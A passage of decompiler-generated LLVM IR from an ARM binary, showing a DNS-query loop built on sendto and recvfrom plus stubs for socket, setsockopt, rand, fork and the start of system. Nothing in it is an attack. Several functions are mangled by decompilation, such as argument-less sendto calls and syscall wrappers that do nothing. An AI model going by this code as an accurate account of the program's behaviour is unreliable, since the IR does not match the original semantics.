  %v1_dcb0 = inttoptr i32 %v0_dcb0 to i32*
  %v2_dcb0 = load i32, i32* %v1_dcb0, align 4
  store i32 %v2_dcb0, i32* %r3.global-to-local, align 4
  %v1_dcb4 = add i32 %v2_dcb0, 3
  %v2_dcb4 = inttoptr i32 %v1_dcb4 to i8*
  %v3_dcb4 = load i8, i8* %v2_dcb4, align 1
  %tmp220 = urem i8 %v3_dcb4, 16
  %v1_dcb8 = zext i8 %tmp220 to i32
  store i32 %v1_dcb8, i32* @r3, align 4
  %v7_dcbc = icmp eq i8 %tmp220, 2
  br i1 %v7_dcbc, label %dec_label_pc_dcd8, label %dec_label_pc_dcc4

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dcb0
  %v7_dcc4 = icmp eq i8 %tmp220, 3
  br i1 %v7_dcc4, label %dec_label_pc_dd2c, label %dec_label_pc_dccc

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dcc4
  %v2_dccc = icmp eq i8 %tmp220, 0
  br i1 %v2_dccc, label %dec_label_pc_dd2c, label %dec_label_pc_dd84

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dcb0
  store i32 %v0_dce4, i32* %r3.global-to-local, align 4
  %v2_dcdc = icmp eq i32 %v0_dce4, 0
  br i1 %v2_dcdc, label %dec_label_pc_dd84, label %dec_label_pc_dcf4

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_dcd8
  %v1_dce4 = add i32 %v0_dce4, -1
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v2_dd04 = add i32 %v3_dc9c, %arg3
  %v3_dd04 = inttoptr i32 %v2_dd04 to i32*
  %v4_dd04 = load i32, i32* %v3_dd04, align 4
  store i32 %v4_dd04, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_dd0c = add i32 %v3_dc9c, %arg2
  %v3_dd0c = inttoptr i32 %v2_dd0c to i32*
  %v4_dd0c = load i32, i32* %v3_dd0c, align 4
  store i32 %v4_dd0c, i32* @r1, align 4
  %v0_dd18 = load i32, i32* @sl, align 4
  store i32 %v0_dd18, i32* @r0, align 4
  store i32 16384, i32* @r3, align 4
  %v0_dd24 = call i32 @sendto()
  br label %dec_label_pc_dd84

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dccc, %dec_label_pc_dcc4
  %v9_dd2c = icmp eq i32 %v0_dd2c, %v1_dc44
  br i1 %v9_dd2c, label %dec_label_pc_dd48.preheader, label %dec_label_pc_dd64

dec_label_pc_dd48.preheader:                      ; preds = %dec_label_pc_dd2c
  store i32 %v3_dc98, i32* %r3.global-to-local, align 4
  %v0_dd34135 = load i32, i32* @r5, align 4
  store i32 %v0_dd34135, i32* %v3_dca0, align 4
  %v1_dd38 = load i32, i32* %r3.global-to-local, align 4
  %v2_dd38 = load i32, i32* %r1.global-to-local, align 4
  %v3_dd38 = add i32 %v2_dd38, %v1_dd38
  store i32 %v3_dd38, i32* @r2, align 4
  store i32 %arg1, i32* @ip, align 4
  %v0_dd4c45 = load i32, i32* @sb, align 4
  %v6_dd5054 = icmp slt i32 %v0_dd4c45, %arg1
  br i1 %v6_dd5054, label %dec_label_pc_dd54, label %dec_label_pc_dd78

dec_label_pc_dd44:                                ; preds = %dec_label_pc_dd54
  %v1_dd44 = add nsw i32 %v0_dd44, 1
  store i32 %v1_dd44, i32* @sb, align 4
  store i32 %arg1, i32* @ip, align 4
  %v6_dd50 = icmp slt i32 %v1_dd44, %arg1
  br i1 %v6_dd50, label %dec_label_pc_dd54, label %dec_label_pc_dd48.dec_label_pc_dd78.loopexit_crit_edge

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd48.preheader, %dec_label_pc_dd44
  %v0_dd44 = phi i32 [ %v1_dd44, %dec_label_pc_dd44 ], [ %v0_dd4c45, %dec_label_pc_dd48.preheader ]
  %v0_dd54 = phi i32 [ %v4_dd54, %dec_label_pc_dd44 ], [ %v3_dd38, %dec_label_pc_dd48.preheader ]
  %v1_dd54 = inttoptr i32 %v0_dd54 to i32*
  %v2_dd54 = load i32, i32* %v1_dd54, align 4
  store i32 %v2_dd54, i32* %r3.global-to-local, align 4
  %v4_dd54 = add i32 %v0_dd54, 4
  store i32 %v4_dd54, i32* @r2, align 4
  %v2_dd58 = icmp eq i32 %v2_dd54, 0
  br i1 %v2_dd58, label %dec_label_pc_dd54.dec_label_pc_dd78.loopexit_crit_edge, label %dec_label_pc_dd44

dec_label_pc_dd64:                                ; preds = %dec_label_pc_dd2c
  %v0_dd34137 = load i32, i32* @r5, align 4
  store i32 %v0_dd34137, i32* %v3_dca0, align 4
  %v1_dd68.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_dd68 = add i32 %v1_dd68.pre, %arg4
  %v3_dd68 = inttoptr i32 %v2_dd68 to i32*
  %v4_dd68 = load i32, i32* %v3_dd68, align 4
  %v0_dd6c = load i32, i32* @r8, align 4
  %v1_dd6c = inttoptr i32 %v0_dd6c to i32*
  %v2_dd6c = load i32, i32* %v1_dd6c, align 4
  store i32 %v2_dd6c, i32* %r1.global-to-local, align 4
  %v0_dd70 = load i32, i32* @r5, align 4
  %v3_dd74 = inttoptr i32 %v4_dd68 to i16*
  %v4_dd74 = call i32 @memcpy(i16* %v3_dd74, i32 %v2_dd6c, i32 %v0_dd70)
  %v0_dd7c.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_dd78

dec_label_pc_dd48.dec_label_pc_dd78.loopexit_crit_edge: ; preds = %dec_label_pc_dd44
  br label %dec_label_pc_dd78

dec_label_pc_dd54.dec_label_pc_dd78.loopexit_crit_edge: ; preds = %dec_label_pc_dd54
  br label %dec_label_pc_dd78

dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd48.preheader, %dec_label_pc_dd48.dec_label_pc_dd78.loopexit_crit_edge, %dec_label_pc_dd54.dec_label_pc_dd78.loopexit_crit_edge, %dec_label_pc_dd64
  %v0_dd7c = phi i32 [ %v0_dd7c.pre, %dec_label_pc_dd64 ], [ %v0_dd44, %dec_label_pc_dd54.dec_label_pc_dd78.loopexit_crit_edge ], [ %v1_dd44, %dec_label_pc_dd48.dec_label_pc_dd78.loopexit_crit_edge ], [ %v0_dd4c45, %dec_label_pc_dd48.preheader ]
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v9_dd7c = icmp eq i32 %v0_dd7c, %arg1
  br i1 %v9_dd7c, label %dec_label_pc_dde4, label %dec_label_pc_dd84

dec_label_pc_dd84:                                ; preds = %dec_label_pc_dc38, %dec_label_pc_dbf8, %dec_label_pc_dccc, %dec_label_pc_dc98, %dec_label_pc_dd78, %dec_label_pc_dcd8, %dec_label_pc_dc94, %dec_label_pc_dcf4, %dec_label_pc_dbd4
  %v0_dce4 = phi i32 [ %stack_var_-700.0, %dec_label_pc_dbd4 ], [ 0, %dec_label_pc_dcd8 ], [ %v1_dce4, %dec_label_pc_dcf4 ], [ %v0_dce4, %dec_label_pc_dd78 ], [ %v0_dce4, %dec_label_pc_dccc ], [ %v0_dce4, %dec_label_pc_dc98 ], [ %v0_dce4, %dec_label_pc_dc94 ], [ %v0_dce4, %dec_label_pc_dbf8 ], [ %v0_dce4, %dec_label_pc_dc38 ]
  %v0_dd88 = load i32, i32* @sb, align 4
  %v3_dd88 = mul i32 %v0_dd88, 4
  store i32 %v3_dd88, i32* @r6, align 4
  %v2_dd8c = add i32 %v3_dd88, %arg4
  %v3_dd8c = inttoptr i32 %v2_dd8c to i32*
  %v4_dd8c = load i32, i32* %v3_dd8c, align 4
  store i32 %v4_dd8c, i32* @r1, align 4
  store i32 %arg6, i32* @r2, align 4
  %v0_dda4 = load i32, i32* @sl, align 4
  store i32 %v0_dda4, i32* @r0, align 4
  store i32 0, i32* @r3, align 4
  %v0_ddb4 = call i32 @recvfrom()
  store i32 %v0_ddb4, i32* @r5, align 4
  %v1_ddbc = icmp slt i32 %v0_ddb4, 0
  %v1_ddc0 = load i32, i32* @r6, align 4
  %v2_ddc0 = add i32 %v1_ddc0, %arg4
  store i32 %v2_ddc0, i32* @r8, align 4
  br i1 %v1_ddbc, label %dec_label_pc_ddc8, label %dec_label_pc_dbf8

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_dd84, %dec_label_pc_dbd4
  %v0_ddc8 = phi i32 [ %v4_dbe8, %dec_label_pc_dbd4 ], [ %v0_ddb4, %dec_label_pc_dd84 ]
  %stack_var_-700.2 = phi i32 [ %stack_var_-700.0, %dec_label_pc_dbd4 ], [ %v0_dce4, %dec_label_pc_dd84 ]
  %v1_ddc8 = call i32 @mtime(i32 %v0_ddc8)
  store i32 %v1_ddc8, i32* @r7, align 4
  br label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_dae8, %dec_label_pc_ddc8
  %v1_db48 = phi i32 [ %v1_db0c, %dec_label_pc_dae8 ], [ %v1_ddc8, %dec_label_pc_ddc8 ]
  %stack_var_-700.3 = phi i32 [ %tmp140, %dec_label_pc_dae8 ], [ %stack_var_-700.2, %dec_label_pc_ddc8 ]
  store i32 %v1_db0c, i32* @ip, align 4
  store i32 %stack_var_-704.5, i32* @r2, align 4
  %v2_ddd8 = sub i32 %v1_db48, %v1_db0c
  store i32 %v2_ddd8, i32* %r3.global-to-local, align 4
  %v3_dddc = icmp ult i32 %v2_ddd8, %stack_var_-704.5
  br i1 %v3_dddc, label %dec_label_pc_db44, label %dec_label_pc_dde4

dec_label_pc_dde4:                                ; preds = %dec_label_pc_ddd0, %dec_label_pc_dd78
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_ddec = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-76, i32 1)
  br label %dec_label_pc_de18

dec_label_pc_de00:                                ; preds = %dec_label_pc_d948, %dec_label_pc_d93c
  %stack_var_-696.4 = phi i32 [ %stack_var_-696.1, %dec_label_pc_d948 ], [ %stack_var_-696.0, %dec_label_pc_d93c ]
  %stack_var_-692.3 = phi i32 [ %v0_d8a8, %dec_label_pc_d948 ], [ %stack_var_-692.0, %dec_label_pc_d93c ]
  %stack_var_-704.6 = phi i32 [ %stack_var_-704.3, %dec_label_pc_d948 ], [ %stack_var_-704.2, %dec_label_pc_d93c ]
  %v1_de04 = call i32 @__fclose_ca(i32 %v7_d6d4)
  store i32 %stack_var_-692.3, i32* %r3.global-to-local, align 4
  %v2_de0c = icmp eq i32 %stack_var_-692.3, 0
  br i1 %v2_de0c, label %dec_label_pc_d97c, label %dec_label_pc_d9ac

dec_label_pc_de18:                                ; preds = %dec_label_pc_da04, %dec_label_pc_da0c, %dec_label_pc_dde4
  %storemerge = phi i32 [ 0, %dec_label_pc_dde4 ], [ -1, %dec_label_pc_da0c ], [ -1, %dec_label_pc_da04 ]
  store i32 %v9_d67c, i32* @r6, align 4
  store i32 %v15_d67c, i32* @r8, align 4
  store i32 %v18_d67c, i32* @sb, align 4
  store i32 %v24_d67c, i32* @fp, align 4
  store i32 %v27_d67c, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-704.6, { 1, 0 }
  uselistorder i32 %stack_var_-692.3, { 2, 1, 0 }
  uselistorder i32 %stack_var_-696.4, { 1, 0 }
  uselistorder i32 %v1_db48, { 3, 2, 1, 0 }
  uselistorder i32 %v0_ddb4, { 0, 2, 3, 1 }
  uselistorder i32 %v3_dd88, { 1, 0 }
  uselistorder i32 %v0_dce4, { 0, 8, 9, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v4_dd54, { 1, 0 }
  uselistorder i32 %v0_dd54, { 1, 0 }
  uselistorder i32 %v0_dd4c45, { 1, 0, 2 }
  uselistorder i32 %v3_dc9c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_dd2c, { 1, 0 }
  uselistorder i32 %v1_dc78, { 1, 0 }
  uselistorder i32 %v1_dc44, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %stack_var_-700.0, { 1, 0 }
  uselistorder i32 %v1_dbb8, { 1, 0 }
  uselistorder i32 %v1_dbb4, { 1, 2, 0 }
  uselistorder i32 %v2_dba0, { 1, 0 }
  uselistorder i32 %v0_dbac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_db64, { 1, 0 }
  uselistorder i32 %v2_db1c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_db0c, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v1_dad8, { 1, 0 }
  uselistorder i32 %v1_dad4, { 1, 2, 0 }
  uselistorder i32 %v0_da94, { 1, 0 }
  uselistorder i32 %v3_d9c0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-704.5, { 1, 0, 2 }
  uselistorder i32 %stack_var_-692.2, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 %stack_var_-696.3, { 0, 2, 1 }
  uselistorder i32 %stack_var_-704.3, { 6, 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v0_d8a8, { 7, 6, 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %stack_var_-696.1, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-692.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-696.0, { 1, 0 }
  uselistorder i32 %storemerge139, { 1, 0, 2, 4, 3 }
  uselistorder i32 %stack_var_-704.2, { 1, 0 }
  uselistorder i32 %v1_d7b8, { 1, 2, 0, 3 }
  uselistorder i1 %v2_d78c, { 1, 0 }
  uselistorder i32 %v1_d75c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_d81c, { 1, 0 }
  uselistorder i32 %v2_d7d0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_d738, { 1, 0 }
  uselistorder i8* %v3_d954, { 2, 0, 1 }
  uselistorder i32 %v2_d70c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_d69c, { 2, 4, 5, 6, 3, 0, 1, 7, 8 }
  uselistorder i32 %v2_d698, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i16* %stack_var_-132, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i8 %tmp150, { 1, 0 }
  uselistorder i8 %tmp149, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 44, 41, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 43, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 16, 10, 11, 12, 13, 14, 15, 17, 18, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @setsockopt, { 3, 2, 1, 0 }
  uselistorder i32 526338, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32, i32)* @fgets, { 4, 0, 5, 1, 2, 3 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 3, 2, 1, 0, 4 }
  uselistorder i32 53, { 2, 0, 1, 3 }
  uselistorder i32 ()* @__lookup_ipliteral, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strtoul, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32 %arg1, { 9, 8, 11, 10, 4, 5, 0, 12, 6, 14, 13, 7, 3, 1, 2, 15 }
  uselistorder label %dec_label_pc_de18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ddd0, { 1, 0 }
  uselistorder label %dec_label_pc_dd84, { 4, 7, 5, 2, 3, 6, 0, 1, 8 }
  uselistorder label %dec_label_pc_dd78, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dd54, { 1, 0 }
  uselistorder label %dec_label_pc_dc98, { 1, 0 }
  uselistorder label %dec_label_pc_dc64, { 1, 0 }
  uselistorder label %dec_label_pc_dc10, { 1, 0 }
  uselistorder label %dec_label_pc_dbd4, { 1, 0 }
  uselistorder label %dec_label_pc_db9c, { 1, 0 }
  uselistorder label %dec_label_pc_db60, { 1, 0 }
  uselistorder label %dec_label_pc_dad4, { 1, 0 }
  uselistorder label %dec_label_pc_da88, { 1, 0 }
  uselistorder label %dec_label_pc_da04, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d93c, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d874, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_d868, { 1, 0 }
  uselistorder label %dec_label_pc_d838, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d834, { 1, 0 }
  uselistorder label %bb195, { 6, 0, 2, 3, 4, 5, 1 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %dec_label_pc_d748, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_de40(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
dec_label_pc_de40:
  %v0_de40 = load i32, i32* @r0, align 4
  %v1_de40 = call i32 @exit(i32 %v0_de40)
  %v0_de44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_de44, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_de40
  %v1_de44 = load i32, i32* @r8, align 4
  %v5_de44 = mul i32 %arg2, 65536
  %v6_de44 = and i32 %v1_de44, %v5_de44
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_de40, %bb
  %v10_de4c = phi i32 [ %v1_de40, %dec_label_pc_de40 ], [ %v6_de44, %bb ]
  ret i32 %v10_de4c

; uselistorder directives
  uselistorder i32 (i32)* @exit, { 11, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_de64 = call i32 @sendto()
  ret i32 %v0_de64

; uselistorder directives
  uselistorder i32 ()* @sendto, { 2, 1, 0, 3 }
}

define i32 @sendto() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v0_de74 = load i32, i32* @lr, align 4
  %v0_de78 = load i32, i32* @r1, align 4
  %v0_de80 = load i32, i32* @r2, align 4
  store i32 %v0_de80, i32* @lr, align 4
  store i32 %v0_de78, i32* @r2, align 4
  %v0_de94 = load i32, i32* @r0, align 4
  %v0_de98 = load i32, i32* @r3, align 4
  store i32 %v0_de80, i32* @r3, align 4
  %v7_dea8 = call i32 @__syscall_cp(i32 290, i32 %v0_de94, i32 %v0_de78, i32 %v0_de80, i32 %v0_de98, i32 %tmp3, i32 %tmp1)
  store i32 %v7_dea8, i32* @r0, align 4
  %v0_deac = call i32 @__syscall_ret()
  store i32 %v0_de74, i32* @lr, align 4
  ret i32 %v0_deac

; uselistorder directives
  uselistorder i32 %v0_de80, { 1, 0, 2 }
}

define i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_dec0 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_ded4 = call i32 @__syscall_ret()
  store i32 %v3_dec0, i32* @r4, align 4
  ret i32 %v0_ded4
}

define i32 @__syscall3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  ret i32 %arg2
}

define i32 @__syscall6(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v3_df30 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v7_df64 = call i32 @__syscall6(i32 281, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_df64, i32* @r0, align 4
  %v0_df68 = call i32 @__syscall_ret()
  %v1_df6c = icmp slt i32 %v0_df68, 0
  br i1 %v1_df6c, label %dec_label_pc_df74, label %dec_label_pc_e010

dec_label_pc_df74:                                ; preds = %entry
  %v0_df74 = call i32 @__errno_location()
  %v1_df78 = inttoptr i32 %v0_df74 to i32*
  %v2_df78 = load i32, i32* %v1_df78, align 4
  %v7_df7c = icmp eq i32 %v2_df78, 22
  br i1 %v7_df7c, label %dec_label_pc_df94, label %dec_label_pc_df84

dec_label_pc_df84:                                ; preds = %dec_label_pc_df74
  %v0_df84 = call i32 @__errno_location()
  %v1_df88 = inttoptr i32 %v0_df84 to i32*
  %v2_df88 = load i32, i32* %v1_df88, align 4
  %v7_df8c = icmp eq i32 %v2_df88, 93
  br i1 %v7_df8c, label %dec_label_pc_df94, label %dec_label_pc_e010

dec_label_pc_df94:                                ; preds = %dec_label_pc_df84, %dec_label_pc_df74
  %v0_df98 = load i32, i32* %r5.global-to-local, align 4
  %v2_df98 = and i32 %v0_df98, 526336
  %v2_df9c = icmp eq i32 %v2_df98, 0
  br i1 %v2_df9c, label %dec_label_pc_e010, label %dec_label_pc_dfa4

dec_label_pc_dfa4:                                ; preds = %dec_label_pc_df94
  %v0_dfa8 = load i32, i32* %r7.global-to-local, align 4
  %v1_dfac = and i32 %v0_df98, -526337
  %v0_dfb0 = load i32, i32* %r8.global-to-local, align 4
  %v0_dfb8 = load i32, i32* @r4, align 4
  %v7_dfc4 = call i32 @__syscall6(i32 281, i32 %v0_dfa8, i32 %v1_dfac, i32 %v0_dfb0, i32 %v0_dfb8, i32 %v0_dfb8, i32 %v0_dfb8)
  store i32 %v7_dfc4, i32* @r0, align 4
  %v0_dfc8 = call i32 @__syscall_ret()
  %v1_dfcc = icmp slt i32 %v0_dfc8, 0
  br i1 %v1_dfcc, label %dec_label_pc_e010, label %dec_label_pc_dfd4

dec_label_pc_dfd4:                                ; preds = %dec_label_pc_dfa4
  %v0_dfd4 = load i32, i32* %r5.global-to-local, align 4
  %v1_dfd4 = and i32 %v0_dfd4, 524288
  %v2_dfd4 = icmp eq i32 %v1_dfd4, 0
  br i1 %v2_dfd4, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_dfd4
  store i32 2, i32* @r2, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_dfd4, %bb
  %v1_dfe8 = xor i1 %v2_dfd4, true
  call void @__pseudo_cond_branch(i1 %v1_dfe8, i32 ptrtoint (i32* @global_var_dee4.515 to i32))
  %v0_dfec = load i32, i32* %r5.global-to-local, align 4
  %v1_dfec = and i32 %v0_dfec, 2048
  %v2_dfec = icmp eq i32 %v1_dfec, 0
  br i1 %v2_dfec, label %.thread5, label %bb15

bb15:                                             ; preds = %.thread2
  store i32 4, i32* @r2, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread2, %bb15
  %v1_e000 = xor i1 %v2_dfec, true
  call void @__pseudo_cond_branch(i1 %v1_e000, i32 ptrtoint (i32* @global_var_dee4.515 to i32))
  br label %dec_label_pc_e010

dec_label_pc_e010:                                ; preds = %dec_label_pc_df94, %entry, %dec_label_pc_df84, %.thread5, %dec_label_pc_dfa4
  %storemerge.in = phi i32* [ @r4, %dec_label_pc_dfa4 ], [ @r4, %.thread5 ], [ @r6, %dec_label_pc_df84 ], [ @r6, %entry ], [ @r6, %dec_label_pc_df94 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %v3_df30, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__syscall6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_e010, { 3, 4, 0, 2, 1 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @"$d.17"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e01c:
  %v0_e01c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e01c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e01c
  %v2_e01c = load i32, i32* @sb, align 4
  %v8_e01c = shl i32 %v2_e01c, %arg2
  %v9_e01c = and i32 %v8_e01c, %arg1
  %v1_e020 = load i32, i32* @r8, align 4
  %v5_e020 = mul i32 %v9_e01c, 65536
  %v6_e020 = and i32 %v5_e020, %v1_e020
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e01c, %bb
  %v7_e020 = phi i32 [ %arg1, %dec_label_pc_e01c ], [ %v6_e020, %bb ]
  ret i32 %v7_e020

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e024 = add i32 %arg1, -1
  store i32 %v1_e024, i32* @global_var_23d08.517, align 4
  store i32 0, i32* @global_var_23d0c.518, align 4
  ret i32 %v1_e024
}

define i32 @rand() local_unnamed_addr {
entry:
  %v3_e048 = load i32, i32* @global_var_23d0c.518, align 4
  %v2_e04c = mul i32 %v3_e048, 1284865837
  %v2_e050 = load i32, i32* @global_var_23d08.517, align 4
  %v6_e058 = udiv i32 %v2_e050, 4
  %v3_e05c = mul i32 %v2_e050, 1481765933
  %v4_e05c = add i32 %v3_e05c, %v2_e04c
  %v5_e070 = add i32 %v6_e058, %v4_e05c
  %v3_e074 = udiv i32 %v5_e070, 2
  store i32 %v5_e070, i32* @global_var_23d0c.518, align 4
  ret i32 %v3_e074

; uselistorder directives
  uselistorder i32 %v5_e070, { 1, 0 }
  uselistorder i32 %v2_e050, { 1, 0 }
  uselistorder i32* @global_var_23d08.517, { 1, 0 }
}

define i32 @_dummy.3() local_unnamed_addr {
entry:
  %v1_e090 = load i32, i32* @r0, align 4
  ret i32 %v1_e090
}

define i32 @fork() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v15_e094 = load i32, i32* @lr, align 4
  store i32 -1, i32* @r0, align 4
  %v2_e09c = ptrtoint i32* %stack_var_-152 to i32
  %v1_e0a8 = call i32 @_dummy.3()
  %v1_e0b4 = call i32 @__block_all_sigs(i32 %v2_e09c)
  store i32 %v1_e0b4, i32* @r0, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v0_e0c0 = call i32 @__syscall_ret()
  store i32 %v0_e0c0, i32* %r4.global-to-local, align 4
  %v2_e0c4 = icmp eq i32 %v0_e0c0, 0
  br i1 %v2_e0c4, label %dec_label_pc_e0cc, label %dec_label_pc_e0f0

dec_label_pc_e0cc:                                ; preds = %entry
  %v0_e0cc = call i32 @__aeabi_read_tp()
  store i32 %v0_e0cc, i32* %r2.global-to-local, align 4
  %v0_e0d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e0d4 = add i32 %v0_e0d4, 222
  store i32 %v1_e0d4, i32* %r7.global-to-local, align 4
  %v2_e0e0 = add i32 %v0_e0cc, -176
  %v3_e0e0 = inttoptr i32 %v2_e0e0 to i32*
  store i32 %v0_e0cc, i32* %v3_e0e0, align 4
  %v0_e0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e0e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_e0e4 = add i32 %v1_e0e4, -60
  %v3_e0e4 = inttoptr i32 %v2_e0e4 to i32*
  store i32 %v0_e0e4, i32* %v3_e0e4, align 4
  %v0_e0e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e0e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_e0e8 = add i32 %v1_e0e8, -64
  %v3_e0e8 = inttoptr i32 %v2_e0e8 to i32*
  store i32 %v0_e0e8, i32* %v3_e0e8, align 4
  %v0_e0ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e0ec, i32* @global_var_23e94.445, align 4
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %entry, %dec_label_pc_e0cc
  %v1_e0f4 = call i32 @__restore_sigs(i32 %v2_e09c)
  %v0_e0f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e0f8 = sub i32 1, %v0_e0f8
  %v2_e0f8 = icmp ult i32 %v0_e0f8, 2
  br i1 %v2_e0f8, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_e0f0
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_e0f0, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_e0f8, %dec_label_pc_e0f0 ]
  store i32 %storemerge, i32* @r0, align 4
  %v1_e104 = call i32 @_dummy.3()
  %v0_e108 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v15_e094, i32* @lr, align 4
  ret i32 %v0_e108

; uselistorder directives
  uselistorder i32 ()* @_dummy.3, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_e0f0, { 1, 0 }
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i8*, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
